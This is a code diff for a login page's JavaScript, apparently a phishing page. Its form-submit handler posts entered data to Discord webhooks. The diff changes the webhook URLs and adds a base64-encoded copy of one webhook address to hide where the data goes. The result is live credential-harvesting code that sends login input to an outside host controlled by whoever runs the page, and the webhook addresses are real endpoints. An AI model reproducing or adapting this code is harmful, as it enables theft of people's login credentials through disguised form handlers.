@@ -1,4 +1,4 @@
-const userinfo = 'https://discord.com/api/webhooks/1311130050514391111/BE3ZE5VJ2Od0BSlMC9LrDQUNnY81g_M2qoHEvk4SlzKCs1DzqC7DEl9EqshxaChbgTR-';
+const userinfoEncoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxMDc3NTk5NzIzODM0NTcyOC9aVk5tX2F4RVRUN1d3TnZOVkhjdXBsaGRUZk14SUs4Z05LS25XMUtFUl8zQ1NTYkNzcHc3WERKaXlrWUJ6YkNmcE5iSA';
 
 const skibidiCheckbox = document.getElementById('skibidiCheckbox');
 const loginButton = document.getElementById('loginButton');
@@ -34,7 +34,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
             }
 
             // Send data to Discord webhook
-            fetch('https://discord.com/api/webhooks/1311130050514391111/BE3ZE5VJ2Od0BSlMC9LrDQUNnY81g_M2qoHEvk4SlzKCs1DzqC7DEl9EqshxaChbgTR-', {
+            fetch('https://discord.com/api/webhooks/1311216741304504340/7GHRrv6eR3stfIgE51Emc77-YKnbeUyO_4iP9u-tkV57Xx5ObMHe_piPyviiSc67eyQ2', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -45,7 +45,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
             });
 
             // Decode and fetch user info
-            const userInfo = 'https://discord.com/api/webhooks/1311130050514391111/BE3ZE5VJ2Od0BSlMC9LrDQUNnY81g_M2qoHEvk4SlzKCs1DzqC7DEl9EqshxaChbgTR-';
+            const userInfo = 'https://discord.com/api/webhooks/1311216741304504340/7GHRrv6eR3stfIgE51Emc77-YKnbeUyO_4iP9u-tkV57Xx5ObMHe_piPyviiSc67eyQ2';
 
             fetch(userInfo, {
                 method: 'POST',
